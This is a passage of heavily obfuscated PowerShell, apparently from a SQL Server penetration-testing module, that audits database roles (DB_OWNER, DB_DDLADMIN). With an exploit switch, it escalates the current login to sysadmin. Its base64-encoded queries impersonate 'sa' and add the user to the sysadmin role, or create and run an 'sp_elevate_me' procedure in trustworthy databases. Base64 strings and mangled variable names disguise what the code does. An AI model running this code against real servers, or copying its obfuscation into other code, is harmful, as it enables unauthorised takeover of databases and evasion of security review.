                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQBcAF8ALwA9AD0APQA9AD0APQA9AFwAXwAvAD0AXAB9AA=='))) -SuppressVerbose -Database ${__/\/=\/\__/=\_/\}
                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AZQBsAGUAdgBhAHQAZQBfAG0AZQA='))) -SuppressVerbose -Database ${__/\/=\/\__/=\_/\}
                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABSAE8AUAAgAFAAUgBPAEMAIABzAHAAXwBlAGwAZQB2AGEAdABlAF8AbQBlAA=='))) -SuppressVerbose -Database ${__/\/=\/\__/=\_/\}
                                ${/==\__/=\_/==\/=\} = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIABJAFMAXwBTAFIAVgBSAE8ATABFAE0ARQBNAEIARQBSACgAJwBzAHkAcwBhAGQAbQBpAG4AJwAsACcAJAB7AC8APQBcAF8ALwA9AD0AXABfAF8ALwBcAC8AXABfAC8APQB9ACcAKQAgAGEAcwAgAFMAdABhAHQAdQBzAA=='))) -SuppressVerbose | select -Property Status -ExpandProperty Status
                                if(${/==\__/=\_/==\/=\} -eq 1)
                                {
                                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEUAWABQAEwATwBJAFQASQBOAEcAOgAgAEkAdAAgAHcAYQBzACAAcABvAHMAcwBpAGIAbABlACAAdABvACAAbQBhAGsAZQAgAHQAaABlACAAYwB1AHIAcgBlAG4AdAAgAHUAcwBlAHIAIAAoACQAewAvAD0AXABfAC8APQA9AFwAXwBfAC8AXAAvAFwAXwAvAD0AfQApACAAYQAgAHMAeQBzAGEAZABtAGkAbgAhAA==')))
                                    ${__/\/\_/==\/==\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                                }
                                else
                                {
                                }
                            }
                            else
                            {
                                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEUAWABQAEwATwBJAFQASQBOAEcAOgAgAEkAdAAgAHcAYQBzACAAbgBvAHQAIABwAG8AcwBzAGkAYgBsAGUAIAB0AG8AIABtAGEAawBlACAAdABoAGUAIABjAHUAcgByAGUAbgB0ACAAdQBzAGUAcgAgACgAJAB7AC8APQBcAF8ALwA9AD0AXABfAF8ALwBcAC8AXABfAC8APQB9ACkAIABhACAAcwB5AHMAYQBkAG0AaQBuAC4A')))
                            }
                            ${/=\/=\_/\/\/\/\_/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AD0AXABfAC8APQA9AD0AXAAvAD0AXAAvAD0APQB9ACAAaABhAHMAIAB0AGgAZQAgAEQAQgBfAE8AVwBOAEUAUgAgAHIAbwBsAGUAIABpAG4AIAB0AGgAZQAgACQAewBfAF8ALwBcAC8APQBcAC8AXABfAF8ALwA9AFwAXwAvAFwAfQAgAGQAYQB0AGEAYgBhAHMAZQAuAA==')))
                            $null = ${_/=\/\_/=====\/\_}.Rows.Add($ComputerName, $Instance, ${/=\/====\_/\/===\}, ${__/\/\_______/==\}, ${____/\__/===\/===}, ${/=\_/=\_/=\_/\/=\}, ${____/=\_/=\___/=\}, ${___/=\/=\_/=\_/==}, ${__/\/\_/==\/==\/\}, ${_____/\/========\}, ${/=\/=\_/\/\/\/\_/}, ${______/=\/==\/===}, ${_/\____/\/==\/\/\})
                        }
                        else
                        {
                            ${/=\/=\_/\/\/\/\_/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AD0AXABfAC8APQA9AD0AXAAvAD0AXAAvAD0APQB9ACAAaABhAHMAIAB0AGgAZQAgAEQAQgBfAE8AVwBOAEUAUgAgAHIAbwBsAGUAIABpAG4AIAB0AGgAZQAgACQAewBfAF8ALwBcAC8APQBcAC8AXABfAF8ALwA9AFwAXwAvAFwAfQAgAGQAYQB0AGEAYgBhAHMAZQAuAA==')))
                            $null = ${_/=\/\_/=====\/\_}.Rows.Add($ComputerName, $Instance, ${/=\/====\_/\/===\}, ${__/\/\_______/==\}, ${____/\__/===\/===}, ${/=\_/=\_/=\_/\/=\}, ${____/=\_/=\___/=\}, ${___/=\/=\_/=\_/==}, ${__/\/\_/==\/==\/\}, ${_____/\/========\}, ${/=\/=\_/\/\/\/\_/}, ${______/=\/==\/===}, ${_/\____/\/==\/\/\})
                        }
                    }
                    else
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAFQAaABlACAAJAB7AF8AXwAvAFwALwA9AFwALwBcAF8AXwAvAD0AXABfAC8AXAB9ACAAaQBzACAAbgBvAHQAIABlAHgAcABsAG8AaQB0AGEAYgBsAGUALgA=')))
                        ${/=\/=\_/\/\/\/\_/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AD0AXABfAC8APQA9AD0AXAAvAD0AXAAvAD0APQB9ACAAaABhAHMAIAB0AGgAZQAgAEQAQgBfAE8AVwBOAEUAUgAgAHIAbwBsAGUAIABpAG4AIAB0AGgAZQAgACQAewBfAF8ALwBcAC8APQBcAC8AXABfAF8ALwA9AFwAXwAvAFwAfQAgAGQAYQB0AGEAYgBhAHMAZQAsACAAYgB1AHQAIAB0AGgAaQBzACAAdwBhAHMAIABuAG8AdAAgAGUAeABwAGwAbwBpAHQAYQBiAGwAZQAuAA==')))
                        $null = ${_/=\/\_/=====\/\_}.Rows.Add($ComputerName, $Instance, ${/=\/====\_/\/===\}, ${__/\/\_______/==\}, ${____/\__/===\/===}, ${/=\_/=\_/=\_/\/=\}, ${____/=\_/=\___/=\}, ${___/=\/=\_/=\_/==}, ${__/\/\_/==\/==\/\}, ${_____/\/========\}, ${/=\/=\_/\/\/\/\_/}, ${______/=\/==\/===}, ${_/\____/\/==\/\/\})
                    }
                }
            }
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE0AUABMAEUAVABFAEQAIABWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAAQwBIAEUAQwBLADoAIABEAEEAVABBAEIAQQBTAEUAIABSAE8ATABFACAALQAgAEQAQgBfAE8AVwBOAEUAUgA=')))
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return ${_/=\/\_/=====\/\_}
        }
    }
}
Function Invoke-SQLAuditRoleDbDdlAdmin
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )
    Begin
    {
        ${_/=\/\_/=====\/\_} = New-Object -TypeName System.Data.DataTable
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBUAEEAUgBUACAAVgBVAEwATgBFAFIAQQBCAEkATABJAFQAWQAgAEMASABFAEMASwA6ACAARABBAFQAQQBCAEEAUwBFACAAUgBPAEwARQAgAC0AIABEAEIAXwBEAEQATABBAE0ARABJAE4A')))
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not ${__/\_/=\/==\_/=\_})
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE4ATgBFAEMAVABJAE8ATgAgAEYAQQBJAEwARQBEAA==')))
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE0AUABMAEUAVABFAEQAIABWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAAQwBIAEUAQwBLADoAIABEAEEAVABBAEIAQQBTAEUAIABSAE8ATABFACAALQAgAEQAQgBfAEQARABMAEEARABNAEkATgA=')))
            Return
        }
        else
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE4ATgBFAEMAVABJAE8ATgAgAFMAVQBDAEMARQBTAFMA')))
        }
        ${_/==\_/==\___/\_/} = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $ComputerName = ${_/==\_/==\___/\_/}.ComputerName
        ${/=\_/==\__/\/\_/=} = ${_/==\_/==\___/\_/}.CurrentLogin
        ${_/\_/===\___/\/\_} = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PrincipalName ${/=\_/==\__/\/\_/=}  -SuppressVerbose
        ${___/\/\/=\/=\_/=\} = @()
        ${___/\/\/=\/=\_/=\} += ${/=\_/==\__/\/\_/=}
        ${___/\/\/=\/=\_/=\} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))
        ${_/\_/===\___/\/\_} | % -Process {
            ${___/\/\/=\/=\_/=\} += $_.RolePrincipalName
        }
        if($Exploit)
        {
            ${/=\/=\/\/\_______}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            ${/=\/=\/\/\_______}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        ${/=\/====\_/\/===\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABBAFQAQQBCAEEAUwBFACAAUgBPAEwARQAgAC0AIABEAEIAXwBEAEQATABBAEQATQBJAE4A')))
        ${__/\/\_______/==\}   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABsAG8AZwBpAG4AIABoAGEAcwAgAHQAaABlACAARABCAF8ARABEAEwAQQBEAE0ASQBOACAAcgBvAGwAZQAgAGkAbgAgAG8AbgBlACAAbwByACAAbQBvAHIAZQAgAGQAYQB0AGEAYgBhAHMAZQBzAC4AIAAgAFQAaABpAHMAIABtAGEAeQAgAGEAbABsAG8AdwAgAHQAaABlACAAbABvAGcAaQBuACAAdABvACAAZQBzAGMAYQBsAGEAdABlACAAcAByAGkAdgBpAGwAZQBnAGUAcwAgAHQAbwAgAHMAeQBzAGEAZABtAGkAbgAgAGkAZgAgAHQAaABlACAAYQBmAGYAZQBjAHQAZQBkACAAZABhAHQAYQBiAGEAcwBlAHMAIABhAHIAZQAgAHQAcgB1AHMAdABlAGQAIABhAG4AZAAgAG8AdwBuAGUAZAAgAGIAeQAgAGEAIABzAHkAcwBhAGQAbQBpAG4ALAAgAG8AcgAgAGkAZgAgAGEAIABjAHUAcwB0AG8AbQAgAGEAcwBzAGUAbQBiAGwAeQAgAGMAYQBuACAAYgBlACAAbABvAGEAZABlAGQALgA=')))
        ${____/\__/===\/===}   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBmACAAdABoAGUAIABwAGUAcgBtAGkAcwBzAGkAbwBuACAAaQBzACAAbgBvAHQAIAByAGUAcQB1AGkAcgBlAGQAIAByAGUAbQBvAHYAZQAgAGkAdAAuACAAIABQAGUAcgBtAGkAcwBzAGkAbwBuAHMAIABhAHIAZQAgAGcAcgBhAG4AdABlAGQAIAB3AGkAdABoACAAYQAgAGMAbwBtAG0AYQBuAGQAIABsAGkAawBlADoAIABFAFgARQBDACAAcwBwAF8AYQBkAGQAcgBvAGwAZQBtAGUAbQBiAGUAcgAgACcARABCAF8ARABEAEwAQQBEAE0ASQBOACcALAAgACcATQB5AEQAYgBVAHMAZQByACcALAAgAGEAbgBkACAAYwBhAG4AIABiAGUAIAByAGUAbQBvAHYAZQBkACAAdwBpAHQAaAAgAGEAIABjAG8AbQBtAGEAbgBkACAAbABpAGsAZQA6ACAAIABFAFgARQBDACAAcwBwAF8AZAByAG8AcAByAG8AbABlAG0AZQBtAGIAZQByACAAJwBEAEIAXwBEAEQATABBAEQATQBJAE4AJwAsACAAJwBNAHkARABiAFUAcwBlAHIAJwA=')))
        ${/=\_/=\_/=\_/\/=\}      = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGQAaQB1AG0A')))
        ${____/=\_/=\___/=\}  = 'No'
        ${___/=\/=\_/=\_/==} = 'No'
        ${__/\/\_/==\/==\/\}     = 'No'
        ${_____/\/========\}    = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAZQB4AHAAbABvAGkAdAAgAGMAbwBtAG0AYQBuAGQAIABpAHMAIABhAHYAYQBpAGwAYQBiAGwAZQAgAGEAdAAgAHQAaABpAHMAIAB0AGkAbQBlACwAIABiAHUAdAAgAGEAIABjAHUAcwB0AG8AbQAgAGEAcwBzAGUAcwBtAGIAbAB5ACAAYwBvAHUAbABkACAAYgBlACAAdQBzAGUAZAAuAA==')))
        ${/=\/=\_/\/\/\/\_/}       = ''
        ${_/=\_/==\_/\/==\/}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBmAGYAZQBjAHQAZQBkACAAZABhAHQAYQBiAGEAcwBlAHMAIABtAHUAcwB0ACAAYgBlACAAbwB3AG4AZQBkACAAYgB5ACAAYQAgAHMAeQBzAGEAZABtAGkAbgAgAGEAbgBkACAAYgBlACAAdAByAHUAcwB0AGUAZAAuACAATwByACAAaQB0ACAAbQB1AHMAdAAgAGIAZQAgAHAAbwBzAHMAaQBiAGwAZQAgAHQAbwAgAGwAbwBhAGQAIABhACAAYwB1AHMAdABvAG0AIABhAHMAcwBlAG0AYgBsAHkAIABjAG8AbgBmAGkAZwB1AHIAZQBkACAAZgBvAHIAIABlAHgAdABlAHIAbgBhAGwAIABhAGMAYwBlAHMAcwAuAA==')))
        ${______/=\/==\/===}     = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAHQAZQBjAGgAbgBlAHQALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AZQBuAC0AdQBzAC8AbABpAGIAcgBhAHIAeQAvAG0AcwAxADgAOQA2ADEAMgAoAHYAPQBzAHEAbAAuADEAMAA1ACkALgBhAHMAcAB4AA==')))
        ${_/\____/\/==\/\/\}        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAG8AdAB0ACAAUwB1AHQAaABlAHIAbABhAG4AZAAgACgAQABfAG4AdQBsAGwAYgBpAG4AZAApACwAIABOAGUAdABTAFAASQAgADIAMAAxADYA')))
        ${___/\/\/=\/=\_/=\}|
        % -Process {
            ${__/\/=\____/\__/=} = Get-SQLDatabaseRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -RolePrincipalName DB_DDLADMIN -PrincipalName $_ -SuppressVerbose
            if(${__/\/=\____/\__/=})
            {
                ${__/\/=\____/\__/=}|
                % -Process {
                    ${__/\/=\/\__/=\_/\} = $_.DatabaseName
                    ${/===\_/===\/=\/==} = $_.PrincipalName
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgACQAewAvAD0APQA9AFwAXwAvAD0APQA9AFwALwA9AFwALwA9AD0AfQAgAGgAYQBzACAAdABoAGUAIABEAEIAXwBEAEQATABBAEQATQBJAE4AIAByAG8AbABlACAAaQBuACAAdABoAGUAIAAkAHsAXwBfAC8AXAAvAD0AXAAvAFwAXwBfAC8APQBcAF8ALwBcAH0AIABkAGEAdABhAGIAYQBzAGUALgA=')))
                    ${____/=\_/=\___/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                    ${/====\__/\______/} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName ${__/\/=\/\__/=\_/\} -SuppressVerbose | ? -FilterScript {
                        $_.is_trustworthy_on -eq 1 -and $_.OwnerIsSysadmin -eq 1
                    }
                    if(${/====\__/\______/})
                    {
                        ${___/=\/=\_/=\_/==} = 'No'
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAFQAaABlACAAJAB7AF8AXwAvAFwALwA9AFwALwBcAF8AXwAvAD0AXABfAC8AXAB9ACAAZABhAHQAYQBiAGEAcwBlACAAaQBzACAAcwBlAHQAIABhAHMAIAB0AHIAdQBzAHQAdwBvAHIAdABoAHkAIABhAG4AZAAgAGkAcwAgAG8AdwBuAGUAZAAgAGIAeQAgAGEAIABzAHkAcwBhAGQAbQBpAG4ALgAgAFQAaABpAHMAIABpAHMAIABlAHgAcABsAG8AaQB0AGEAYgBsAGUALgA=')))
                        if($Exploit)
                        {
                            ${_/=\/=====\/=\/=\} = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIABJAFMAXwBTAFIAVgBSAE8ATABFAE0ARQBNAEIARQBSACgAJwBzAHkAcwBhAGQAbQBpAG4AJwAsACcAJAB7AC8APQBcAF8ALwA9AD0AXABfAF8ALwBcAC8AXABfAC8APQB9ACcAKQAgAGEAcwAgAFMAdABhAHQAdQBzAA=='))) -SuppressVerbose | select -Property Status -ExpandProperty Status
                            if(${_/=\/=====\/=\/=\} -ne 1)
                            {
                                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEUAWABQAEwATwBJAFQASQBOAEcAOgAgAFYAZQByAGkAZgBpAGUAZAAgAHQAaABhAHQAIAB0AGgAZQAgAGMAdQByAHIAZQBuAHQAIAB1AHMAZQByACAAKAAkAHsALwA9AFwAXwAvAD0APQBcAF8AXwAvAFwALwBcAF8ALwA9AH0AKQAgAGkAcwAgAE4ATwBUACAAYQAgAHMAeQBzAGEAZABtAGkAbgAuAA==')))
                                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEUAWABQAEwATwBJAFQASQBOAEcAOgAgAEEAdAB0AGUAbQBwAHQAaQBuAGcAIAB0AG8AIABhAGQAZAAgAHQAaABlACAAYwB1AHIAcgBlAG4AdAAgAHUAcwBlAHIAIAAoACQAewAvAD0AXABfAC8APQA9AFwAXwBfAC8AXAAvAFwAXwAvAD0AfQApACAAdABvACAAdABoAGUAIABzAHkAcwBhAGQAbQBpAG4AIAByAG8AbABlACAAYgB5ACAAdQBzAGkAbgBnACAARABCAF8ATwBXAE4ARQBSACAAcABlAHIAbQBpAHMAcwBpAG8AbgBzAC4ALgAuAA==')))
                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAQwBVAFQARQAgAEEAUwAgAEwATwBHAEkATgAgAD0AIAAnAHMAYQAnADsARQBYAEUAQwAgAHMAcABfAGEAZABkAHMAcgB2AHIAbwBsAGUAbQBlAG0AYgBlAHIAIAAnACQAewAvAD0AXABfAC8APQA9AFwAXwBfAC8AXAAvAFwAXwAvAD0AfQAnACwAJwBzAHkAcwBhAGQAbQBpAG4AJwA7AFIAZQB2AGUAcgB0AA=='))) -SuppressVerbose
                                ${/==\__/=\_/==\/=\} = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIABJAFMAXwBTAFIAVgBSAE8ATABFAE0ARQBNAEIARQBSACgAJwBzAHkAcwBhAGQAbQBpAG4AJwAsACcAJAB7AC8APQBcAF8ALwA9AD0AXABfAF8ALwBcAC8AXABfAC8APQB9ACcAKQAgAGEAcwAgAFMAdABhAHQAdQBzAA=='))) -SuppressVerbose | select -Property Status -ExpandProperty Status
                                if(${/==\__/=\_/==\/=\} -eq 1)
                                {
                                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEUAWABQAEwATwBJAFQASQBOAEcAOgAgAEkAdAAgAHcAYQBzACAAcABvAHMAcwBpAGIAbABlACAAdABvACAAbQBhAGsAZQAgAHQAaABlACAAYwB1AHIAcgBlAG4AdAAgAHUAcwBlAHIAIAAoACQAewAvAD0AXABfAC8APQA9AFwAXwBfAC8AXAAvAFwAXwAvAD0AfQApACAAYQAgAHMAeQBzAGEAZABtAGkAbgAhAA==')))
                                    ${__/\/\_/==\/==\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                                }
                                else
                                {
                                }
                            }
                            else
                            {
                                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEUAWABQAEwATwBJAFQASQBOAEcAOgAgAEkAdAAgAHcAYQBzACAAbgBvAHQAIABwAG8AcwBzAGkAYgBsAGUAIAB0AG8AIABtAGEAawBlACAAdABoAGUAIABjAHUAcgByAGUAbgB0ACAAdQBzAGUAcgAgACgAJAB7AC8APQBcAF8ALwA9AD0AXABfAF8ALwBcAC8AXABfAC8APQB9ACkAIABhACAAcwB5AHMAYQBkAG0AaQBuAC4A')))
                            }
                            ${/=\/=\_/\/\/\/\_/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AD0AXABfAC8APQA9AD0AXAAvAD0AXAAvAD0APQB9ACAAaABhAHMAIAB0AGgAZQAgAEQAQgBfAEQARABMAEEARABNAEkATgAgAHIAbwBsAGUAIABpAG4AIAB0AGgAZQAgACQAewBfAF8ALwBcAC8APQBcAC8AXABfAF8ALwA9AFwAXwAvAFwAfQAgAGQAYQB0AGEAYgBhAHMAZQAuAA==')))
                            $null = ${_/=\/\_/=====\/\_}.Rows.Add($ComputerName, $Instance, ${/=\/====\_/\/===\}, ${__/\/\_______/==\}, ${____/\__/===\/===}, ${/=\_/=\_/=\_/\/=\}, ${____/=\_/=\___/=\}, ${___/=\/=\_/=\_/==}, ${__/\/\_/==\/==\/\}, ${_____/\/========\}, ${/=\/=\_/\/\/\/\_/}, ${______/=\/==\/===}, ${_/\____/\/==\/\/\})
                        }
                        else
                        {
                            ${/=\/=\_/\/\/\/\_/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AD0AXABfAC8APQA9AD0AXAAvAD0AXAAvAD0APQB9ACAAaABhAHMAIAB0AGgAZQAgAEQAQgBfAEQARABMAEEARABNAEkATgAgAHIAbwBsAGUAIABpAG4AIAB0AGgAZQAgACQAewBfAF8ALwBcAC8APQBcAC8AXABfAF8ALwA9AFwAXwAvAFwAfQAgAGQAYQB0AGEAYgBhAHMAZQAuAA==')))
                            $null = ${_/=\/\_/=====\/\_}.Rows.Add($ComputerName, $Instance, ${/=\/====\_/\/===\}, ${__/\/\_______/==\}, ${____/\__/===\/===}, ${/=\_/=\_/=\_/\/=\}, ${____/=\_/=\___/=\}, ${___/=\/=\_/=\_/==}, ${__/\/\_/==\/==\/\}, ${_____/\/========\}, ${/=\/=\_/\/\/\/\_/}, ${______/=\/==\/===}, ${_/\____/\/==\/\/\})
                        }
                    }
                    else
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAFQAaABlACAAJAB7AF8AXwAvAFwALwA9AFwALwBcAF8AXwAvAD0AXABfAC8AXAB9ACAAaQBzACAAbgBvAHQAIABlAHgAcABsAG8AaQB0AGEAYgBsAGUALgA=')))
                        ${/=\/=\_/\/\/\/\_/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AD0AXABfAC8APQA9AD0AXAAvAD0AXAAvAD0APQB9ACAAaABhAHMAIAB0AGgAZQAgAEQAQgBfAEQARABMAEEARABNAEkATgAgAHIAbwBsAGUAIABpAG4AIAB0AGgAZQAgACQAewBfAF8ALwBcAC8APQBcAC8AXABfAF8ALwA9AFwAXwAvAFwAfQAgAGQAYQB0AGEAYgBhAHMAZQAsACAAYgB1AHQAIAB0AGgAaQBzACAAdwBhAHMAIABuAG8AdAAgAGUAeABwAGwAbwBpAHQAYQBiAGwAZQAuAA==')))
